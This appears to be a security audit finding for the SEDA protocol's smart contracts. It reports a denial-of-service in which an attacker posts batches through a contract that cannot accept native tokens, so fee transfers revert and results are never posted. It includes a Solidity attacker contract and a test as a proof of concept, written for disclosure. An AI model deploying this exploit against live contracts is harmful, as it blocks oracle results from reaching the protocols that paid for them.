# batchSender can be a smart contract without the ability to receive native tokens, which would DOS postResult because the fee transfer would fail

### Summary

SedaCoreV1 sends a `batchFee`, if set, to the `batchSender`. The `batchSender` can be an arbitrary contract that does not have a fallback function to receive native tokens. This would cause the call to `postResult` to fail, and the results would not be posted on chain.

### Root Cause

The `batchSender` is retrieved in `postResultAndGetBatchSender` using `verifyResultProof` on the `sedaProver`. 
https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-evm-contracts/contracts/provers/Secp256k1ProverV1.sol#L163
In `verifyResultProof`, you can see that the `batchSender` is simply the address that posted the batch. Since `postBatch` requires no permissions, any contract can do it.
https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-evm-contracts/contracts/core/SedaCoreV1.sol#L181-L190
Here you can see that the fee is transferred to the `batchSender`.
https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-evm-contracts/contracts/core/SedaCoreV1.sol#L356-L360
Here you can see that `postResult` is reverted if the native token transfer fails. This can be intentionally triggered by an attacker if they post the batch using a contract that cannot receive native tokens.

### Internal Pre-conditions

1. The request for which the result is must have a batch fee set

### External Pre-conditions

1. The attacker may need to frontrun someone who also wants to call postBatch

### Attack Path

 1. User posts a request with a batch fee greater than 0
 2. The result for the request is inserted into a batch on the SEDA chain
 3. An attacker calls `postBatch` through a contract that cannot receive native tokens
 4. Someone calls `postResult` for the request on SedaCoreV1, which fails because the batch sender cannot receive fees

### Impact

An attacker can prevent results from being posted and thus prevent the protocol that requested the data from receiving it.

### PoC

The file `contracts/mocks/Attacker.sol` needs to be created, and the following code must be inserted:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Secp256k1ProverV1} from "../provers/Secp256k1ProverV1.sol";
import {SedaDataTypes} from "../libraries/SedaDataTypes.sol";

contract Attacker {
    function attack(
        address prover,         
        SedaDataTypes.Batch calldata newBatch,
        bytes[] calldata signatures,
        SedaDataTypes.ValidatorProof[] calldata validatorProofs
    ) external {
        Secp256k1ProverV1(prover).postBatch(
            newBatch,
            signatures,
            validatorProofs
        );
    }
}
```

The following test can be used in `test/prover/Secp256k1ProverV1.test.ts` and executed with `bun run test`:
```javascript
  async function deployProverFixtureNew() {
    const { prover, core, data } = await deployWithSize({ validators: 4 });
    return { prover, wallets: data.wallets, data, core };
  }

  it('audit-test', async () => {
    const { prover, wallets, data, core } = await loadFixture(deployProverFixtureNew);

    const AttackerFactory = await ethers.getContractFactory('Attacker'); //Attacker contract is being deployed
    const attacker = await upgrades.deployProxy(AttackerFactory);
    await attacker.waitForDeployment();

    await core.postRequest( //A request is posted, setting all fees for the request to 1
      data.requests[0],
      BigInt(1e18),
      BigInt(1e18),
      BigInt(1e18),
      {
        value: ethers.parseEther('3')
      }
    );
    const { newBatch, signatures } = await generateAndSignBatch(wallets, data.initialBatch, [0, 1, 2, 3]);

    //The new batch is passed to the attacker contract so that it can post the batch and be registered as the batch poster
    await attacker.attack(await prover.getAddress(), newBatch, signatures, data.validatorProofs);

    //postResult reverts with the error FeeTransferFailed because the fees cannot be sent to the attacker contract
    await core.postResult(
      data.results[0],
      1,
      data.resultProofs[0]
    );
  });
```
